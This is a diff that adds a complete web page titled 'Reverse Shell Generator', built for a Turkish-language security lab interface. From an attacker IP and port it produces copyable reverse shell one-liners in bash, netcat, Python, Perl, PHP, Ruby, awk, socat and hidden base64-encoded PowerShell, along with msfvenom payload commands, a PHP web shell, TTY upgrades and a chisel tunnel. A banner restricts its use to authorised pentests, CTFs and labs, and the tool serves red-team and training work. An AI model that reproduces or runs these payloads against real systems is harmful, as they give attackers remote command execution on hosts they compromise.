@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reverse Shell Generator | CyberSec Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#030712;--bg1:#080f1e;--bg2:#0d1526;--bg3:#111c30;--cyan:#00f0ff;--purple:#bd00ff;--green:#00ff88;--red:#ff2244;--orange:#ff8c00;--t0:#fff;--t1:#b8cce0;--t2:#5a7a96;--border:rgba(0,240,255,.1);--border2:rgba(0,240,255,.2)}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Rajdhani',sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;padding:24px 16px}
+.container{max-width:960px;margin:0 auto}
+.title{font-size:24px;font-weight:700;color:var(--cyan);margin-bottom:8px;display:flex;align-items:center;gap:10px}
+.title::before{content:'◈';color:var(--red)}
+.soc-note{background:rgba(255,34,68,.05);border:1px solid rgba(255,34,68,.2);border-left:3px solid var(--red);border-radius:6px;padding:12px 16px;font-size:13px;color:var(--t2);margin-bottom:24px;font-family:'JetBrains Mono',monospace}
+.soc-note strong{color:var(--red)}
+.config{background:var(--bg1);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:20px}
+.config-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
+label{font-size:12px;color:var(--t2);text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:6px}
+input,select{width:100%;background:var(--bg2);border:1px solid var(--border);border-radius:8px;color:var(--t0);font-family:'JetBrains Mono',monospace;font-size:13px;padding:10px 14px;outline:none;transition:border-color .2s}
+input:focus,select:focus{border-color:var(--cyan)}
+.shells-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px}
+.shell-card{background:var(--bg1);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+.shell-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--bg2);border-bottom:1px solid var(--border)}
+.shell-name{font-weight:700;color:var(--cyan);font-size:14px;display:flex;align-items:center;gap:8px}
+.shell-lang{font-size:10px;padding:2px 8px;border-radius:10px;border:1px solid var(--border2);color:var(--t2);font-family:'JetBrains Mono',monospace}
+.shell-code{padding:14px 16px;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--green);word-break:break-all;line-height:1.6;min-height:80px;background:var(--bg)}
+.shell-footer{padding:8px 16px;display:flex;gap:8px;border-top:1px solid var(--border)}
+.btn-copy{background:var(--bg2);color:var(--t2);border:1px solid var(--border);border-radius:6px;padding:5px 12px;font-size:11px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.btn-copy:hover{color:var(--cyan);border-color:var(--cyan)}
+.btn-copy.copied{color:var(--green);border-color:var(--green)}
+.encode-badge{font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(189,0,255,.15);color:var(--purple);border:1px solid rgba(189,0,255,.3);cursor:pointer}
+.encode-badge:hover{background:rgba(189,0,255,.25)}
+.section-title{font-size:13px;color:var(--t2);text-transform:uppercase;letter-spacing:1px;margin:24px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+@media(max-width:600px){.config-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="title">REVERSE SHELL GENERATOR</div>
+
+  <div class="soc-note">
+    <strong>⚠ RED TEAM NOTU:</strong> Bu arac sadece yetkili pentest operasyonlari, CTF yarismalari ve lab ortamlari icin tasarlanmistir. Izinsiz sistemlere karsi kullanimi yasaldisi ve etik disidir. Listener baslat: <strong>nc -lvnp [PORT]</strong>
+  </div>
+
+  <div class="config">
+    <div class="config-grid">
+      <div><label>Hedef IP (LHOST)</label><input id="ip" value="10.10.14.1" oninput="generate()"></div>
+      <div><label>Port (LPORT)</label><input id="port" value="4444" oninput="generate()"></div>
+      <div><label>Shell Tipi</label>
+        <select id="shell-type" onchange="generate()">
+          <option value="/bin/bash">/bin/bash</option>
+          <option value="/bin/sh">/bin/sh</option>
+          <option value="cmd.exe">cmd.exe</option>
+          <option value="powershell.exe">powershell.exe</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="section-title">Linux / Unix Shells</div>
+  <div class="shells-grid" id="linux-shells"></div>
+
+  <div class="section-title">Windows Shells</div>
+  <div class="shells-grid" id="win-shells"></div>
+
+  <div class="section-title">Web Shells & Upgrades</div>
+  <div class="shells-grid" id="web-shells"></div>
+</div>
+
+<script>
+function getVals(){return{ip:document.getElementById('ip').value||'10.10.14.1',port:document.getElementById('port').value||'4444',sh:document.getElementById('shell-type').value};}
+
+function b64(s){return btoa(s);}
+
+function generate(){
+  const {ip,port,sh}=getVals();
+  const linuxShells=[
+    {name:'Bash TCP',lang:'bash',code:`bash -i >& /dev/tcp/${ip}/${port} 0>&1`},
+    {name:'Bash UDP',lang:'bash',code:`bash -i >& /dev/udp/${ip}/${port} 0>&1`},
+    {name:'Bash 196',lang:'bash',code:`0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`},
+    {name:'Netcat (nc)',lang:'nc',code:`nc -e ${sh} ${ip} ${port}`},
+    {name:'Netcat (mkfifo)',lang:'nc',code:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`},
+    {name:'Python 3',lang:'python',code:`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${sh}"])'`},
+    {name:'Python 2',lang:'python',code:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["${sh}","-i"])'`},
+    {name:'Perl',lang:'perl',code:`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");'`},
+    {name:'PHP',lang:'php',code:`php -r '$sock=fsockopen("${ip}",${port});exec("${sh} -i <&3 >&3 2>&3");'`},
+    {name:'Ruby',lang:'ruby',code:`ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${sh} -i <&%d >&%d 2>&%d",f,f,f)'`},
+    {name:'Awk',lang:'awk',code:`awk 'BEGIN{s="/inet/tcp/0/${ip}/${port}";while(1){do{printf "shell>" |&s;s|&getline c;if(c){while((c |&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}'`},
+    {name:'Socat',lang:'socat',code:`socat TCP:${ip}:${port} EXEC:${sh}`},
+  ];
+
+  const winShells=[
+    {name:'PowerShell Base64',lang:'ps1',code:`powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${b64(`$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`).replace(/=/g,'')}`},
+    {name:'PowerShell Oneliner',lang:'ps1',code:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sb2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`},
+    {name:'Cmd.exe Netcat',lang:'cmd',code:`nc.exe -e cmd.exe ${ip} ${port}`},
+    {name:'Python (Windows)',lang:'python',code:`python -c "import socket,subprocess;s=socket.socket();s.connect(('${ip}',${port}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"`},
+    {name:'Msfvenom EXE',lang:'msfvenom',code:`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe`},
+    {name:'Msfvenom PS1',lang:'msfvenom',code:`msfvenom -p windows/x64/powershell_reverse_tcp LHOST=${ip} LPORT=${port} -f psh -o shell.ps1`},
+  ];
+
+  const webShells=[
+    {name:'PHP Webshell',lang:'php',code:`<?php system($_GET['cmd']); ?>`},
+    {name:'TTY Upgrade (Python)',lang:'python',code:`python3 -c 'import pty;pty.spawn("${sh}")'`},
+    {name:'TTY Upgrade (Script)',lang:'bash',code:`script /dev/null -c bash`},
+    {name:'Stty Full TTY',lang:'bash',code:`# 1) Ctrl+Z\n# 2) stty raw -echo; fg\n# 3) export TERM=xterm\n# 4) stty rows 38 cols 116`},
+    {name:'Socat TTY',lang:'socat',code:`# Listener:\nsocat file:\`tty\`,raw,echo=0 tcp-listen:${port}\n# Target:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`},
+    {name:'Chisel Tunnel',lang:'chisel',code:`# Server (attacker):\n./chisel server -p 8000 --reverse\n# Client (target):\n./chisel client ${ip}:8000 R:${port}:127.0.0.1:${port}`},
+  ];
+
+  renderShells('linux-shells',linuxShells);
+  renderShells('win-shells',winShells);
+  renderShells('web-shells',webShells);
+}
+
+function renderShells(containerId,shells){
+  document.getElementById(containerId).innerHTML=shells.map(s=>`
+    <div class="shell-card">
+      <div class="shell-header">
+        <span class="shell-name">${s.name} <span class="shell-lang">${s.lang}</span></span>
+      </div>
+      <div class="shell-code">${escHtml(s.code)}</div>
+      <div class="shell-footer">
+        <button class="btn-copy" onclick="copyShell(this,'${escAttr(s.code)}')">Kopyala</button>
+        <button class="btn-copy" onclick="copyB64(this,'${escAttr(s.code)}')">Base64</button>
+      </div>
+    </div>`).join('');
+}
+
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function escAttr(s){return s.replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\n/g,'\\n');}
+
+function copyShell(btn,code){
+  navigator.clipboard.writeText(code.replace(/\\n/g,'\n'));
+  btn.textContent='Kopyalandi!';btn.classList.add('copied');
+  setTimeout(()=>{btn.textContent='Kopyala';btn.classList.remove('copied');},1500);
+}
+function copyB64(btn,code){
+  navigator.clipboard.writeText(btoa(code.replace(/\\n/g,'\n')));
+  btn.textContent='B64 Kopyalandi!';btn.classList.add('copied');
+  setTimeout(()=>{btn.textContent='Base64';btn.classList.remove('copied');},1500);
+}
+generate();
+</script>
+</body>
+</html>
